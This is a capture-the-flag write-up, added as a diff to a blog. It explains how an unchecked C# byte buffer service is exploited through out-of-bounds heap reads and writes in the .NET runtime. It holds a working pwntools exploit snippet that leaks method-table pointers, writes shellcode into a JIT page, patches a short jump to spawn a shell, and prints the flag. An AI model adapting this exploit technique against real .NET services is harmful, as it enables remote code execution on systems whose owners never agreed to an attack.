@@ -1,0 +1,248 @@
+#+title: OverTheWire Advent 2019 - Unmanaged (pwn)
+#+author: Daniel Brodsky
+#+date: 2019-12-15
+#+hugo_base_dir: ../../
+#+hugo_section: writeups
+#+startup: inlineimages
+#+startup: inlineimages
+#+hugo_menu: :menu "foo" :weight 10 :parent main :identifier single-toml
+#+description: Free-range dotnet shenanigans
+
+** Problem
+~I've made a Byte Buffer as a Service (BBAAS)! The service is written in C#, but To avoid performance penalties, we use unsafe code which should have comparable
+performance to C++! Service: nc 3.93.128.89 1208~
+** Analysis
+The question comes in the form of a C# project for Linux with a file
+[[/w2_Program.cs][Program.cs]] containing the source code for the project.
+
+#+BEGIN_SRC C#
+public static int Main(string[] args)
+{
+    // read from stdin
+    BinaryReader reader = new BinaryReader(Console.OpenStandardInput(0));
+    // write to stdout
+    BinaryWriter writer = new BinaryWriter(Console.OpenStandardOutput(0));
+    List<FastByteArray> arrays = new List<FastByteArray>();
+
+    while (true)
+    {
+        byte action = reader.ReadByte(); // first byte is action
+        // Allocate new byte array
+        if (action == 1)
+        {
+            byte length = reader.ReadByte();
+            // add FastByteArray of size 0 - 255 (random bytes)
+            arrays.Add(new FastByteArray(length));
+        }
+        // Write a section of a byte array to stdout
+        else if (action == 2)
+        {
+            byte index = reader.ReadByte();
+            byte offset = reader.ReadByte();
+            byte size = reader.ReadByte();
+            arrays[index].Write(offset, size, writer);
+        }
+        // Read into bytearray from stdin
+        else if (action == 3)
+        {
+            byte index = reader.ReadByte();
+            byte offset = reader.ReadByte();
+            byte size = reader.ReadByte();
+            // no check of offset or size here means arbitrary mem write
+            arrays[index].Read(offset, size, reader);
+        }
+    }
+}
+#+END_SRC
+
+Looking through this
+file, we see that the program reads endlessly from stdin and does 1 of 3 things
+based on input:
+- allocate a new FastByteArray (regular byte array wrapped in an unsafe block)
+  of a given size and append it to a FastByteArray List
+- read a FastByteArray from the list at a given index and offset into the array
+- write new content of a given length to a FastByteArray
+
+Each input can only be a single byte, so any offset, length, or index given can
+be at most ~0xff~ (255). Normally there would be no exploit here since the
+FastByteArray class is a normal implementation for a byte array, but the unsafe
+blocks the class has been wrapped in has disabled bounds-checking. This means we
+can read and write outside of the bounds of our array, potentially modifying
+some important header data in the heap and achieving RCE.
+
+As with most heap-based exploits, we're looking for a way to overwrite a pointer
+in the heap that gets dereferenced to a location in an executable region of
+memory and then write our shellcode there. We already have out of bounds read
+and write access so now we just need a pointer to executed memory to write our
+shellcode to. Inspecting the heap memory of the dotnet binary is difficult with
+just GDB, so I used a Microsoft-provided tool ~dotnet-dump~ to dump labelled
+heap memory at runtime. Using the command ~dumpheap~ we can see the heap layout
+when we create several FastByteArrays and also see how they're located at
+runtime. Below is a portion of the heap at runtime, which contains some of our
+allocated FastByteArray[]. Using the ~dumpmt~ command on the provided MT
+addresses, we can figure out the structure of our array.
+
+#+begin_export html
+<div class="src src-text">
+<div class="highlight">
+<pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<code class="language-text" data-lang="text">
+#+end_export
+| Address in heap  | MT address       | Size | Class                        |
+| 00007f1894008c08 | 00007f18b91214c0 |  124 | Byte[] (the one we write to) |
+| 00007f1894008c88 | 00007f18b91214c0 |   25 | Byte[]                       |
+| 00007f1894008ca8 | 00007f18b91214c0 |   25 | Byte[]                       |
+| 00007f1894008cc8 | 00007f18b9221288 |   24 | FastByteArray                |
+| 00007f1894008ce0 | 00007f18b91214c0 |  124 |                              |
+| 00007f1894008d60 | 00007f18b91214c0 |   25 |                              |
+| 00007f1894008d80 | 00007f18b91214c0 |   25 |                              |
+| 00007f1894008da0 | 00007f18b9221288 |   24 |                              |
+| 00007f1894008db8 | 00007f18b91214c0 |  124 |                              |
+#+begin_export html
+</code></pre></div></div>
+#+end_export
+
+The MT address is the address to the method table for the given object at this
+location. This table contains pointers to the locations of additional metadata
+for this class, including parent classes, EEClass (which holds metadata on the
+class such as number methods, size, etc), source module, and JIT-compiled
+methods among other things. Using the ~telescope~ command in GEF, we can see the
+structure of this table (unlabelled data/pointers is unknown):
+#+BEGIN_SRC
++0x0000: 0x0000001801000000
++0x0008: 0x0000000400034488
++0x0010: Pointer to parent type
++0x0018: Pointer to module -> several JIT address pointers here
++0x0020: 0x00007f38c3f112f0
++0x0028: Pointer to EEClass
++0x0030: 0x00007f38c3d8f608
++0x0038: 0x0000000000000000
++0x0040: 0x00007f38c3f112d0
++0x0048: 0x00007f38c3d80090
+#+END_SRC
+
+Reading the method table during execution of the given program can be done
+thanks to the heap structure of each object in the heap:
+#+BEGIN_SRC
+0x0: *MethodTable for object type
+0x8: private variable(s) in object (or size if array of object)
+object data
+.
+.
+.
+
+#+END_SRC
+
+The FastByteArray object in our heap stores two useful pointers to us: its
+method table and a pointer to the Byte[] we write to. During program execution,
+finding the Byte[] we read and write to is done by dereferencing the pointer in
+the FastByteArray object. If we overwrite this pointer with a different pointer,
+we'll end up having read/write access to any region of memory we want.
+
+
+** Exploit
+We can use any of the many JIT addresses referenced in the method table to get a
+JIT address to write to. However, we need a pointer to a JIT address that's
+called during execution for us to place our shellcode at. Unfortunately, the
+dotnet runtime has a complex system for storing pointers to methods, so finding
+a location where code is executed can be tricky. I've listed a couple methods to
+do this below that I've either found or seen elsewhere:
+- Use backtracing to find a Common Language Runtime (CLR) function that's
+  called, and find its location using a series of reads through the Global
+  Offset Tables of different shared objects
+- Write shellcode to any JIT address, then follow program execution and modify
+  heap pointers to manipulate what address to execute
+- Set a watchpoint on a FastByteArray and backtrace to find the JIT address of
+  the read/write method (simplest method my teammate came up with)
+- Remove execute permissions of all JIT pages and see where the program
+  segfaults for an executed JIT address (my method and the only method I go into
+  detail for)
+
+For any of these methods, getting the JIT address means we know that function's
+location during every program run since we can compute the offset into the JIT
+page for that address on every run. Since we have other pointers to this same
+JIT page, we can just do KNOWN_JIT_ADDR - JIT_PAGE_TOP + TARGET_JIT_ADDR_OFFSET
+to get the address for that run of the program.
+
+
+In GEF I used ~vmmap~ to find all JIT pages during program execution and then
+use
+
+~call (size_t) mprotect(JIT page start, JIT page size, 3)~
+
+to set the page to RW only. Then when I ran the program it would segfault at the
+first access of a JIT page, giving me the address of an executed instruction.
+
+[[/w2_gef_segv.png]]
+
+Unfortunately, this first stop happens during the loop that reads from stdin,
+which all methods trigger. If I attempt to write over instructions at this
+address, I'd end up corrupting my program execution as each byte is written. In
+order to avoid this, I wrote my shellcode to a nearby location to the JIT
+address and then modified a nearby jump instruction to jump to my shellcode
+instead. Changing a short jump is a 1-byte write, so it doesn't corrupt our
+program execution. The brunt of my exploit is located in the snipped below (and
+the full exploit can be found [[/w2_x.py][here]]).
+
+#+BEGIN_SRC python
+"""
+00007fb352321288 - fastbytearray MT (+32 from target addr) ->
+    0x00007fb352321268 - part of unknown MT ->
+        0x00007fb3521a4fe0 (+210 from target JIT address) ->
+            0x7fb3521a4f0e (target JIT address) <- write shellcode here
+
+
+Steps:
+- read fastbytearray MT
+- fastbytearray MT - 32 = location of JIT addr
+- read location of JIT addr
+- JIT addr - 210 = target JIT addr (+18 for jump instruction location)
+- write shellcode to nearby unused address
+- overwrite short jump's offset byte
+- run any command
+"""
+
+array_size = 100
+
+pause()
+
+for _ in range(15):
+    create(array_size)
+
+read(1, array_size + 76, 8)
+# read MT address for FastByteArray
+fba_mt = u64(recv().ljust(8, "\x00"))
+pause()
+# pointer to address in used JIT page
+jit_addr = read_any(fba_mt - 32)
+# address in JIT page to short jump instruction called for all r/w operations
+target_addr = u64(jit_addr) - 192
+print "short jump instruction at: ", hex(target_addr)
+pause()
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+shellcode_addr = target_addr + 115  # I've stopped giving a fuck
+
+write_any(shellcode_addr, shellcode, size=len(shellcode))
+
+# modify short jump to go to unused code area (offset 115 from eip)
+write_any(target_addr + 1, "\x71", size=1)
+
+p.interactive()
+
+#+END_SRC
+
+Running this against the server, we get a shell and then using ~cat flag.txt~ we
+get the flag: ~AOTW{1snt_c0rrupt1nG_manAgeD_M3m0ry_easier_than_y0u_th1nk?}~
+
+
+** Opinion
+This is one of the best kinds of questions to get on a CTF. While it does force
+you to step outside of your comfort zone and work with uncommon frameworks/tools
+like the dotnet ecosystem, there's a lot of freedom in what you can do to get
+flag. By completing this problem, I've learned significantly more about dotnet
+and JIT-compiled runtimes without feeling like I was spending a huge amount of
+time getting tricked, going off course, or not learning.
+
+** References
+https://alexandrnikitin.github.io/blog/dotnet-generics-under-the-hood/
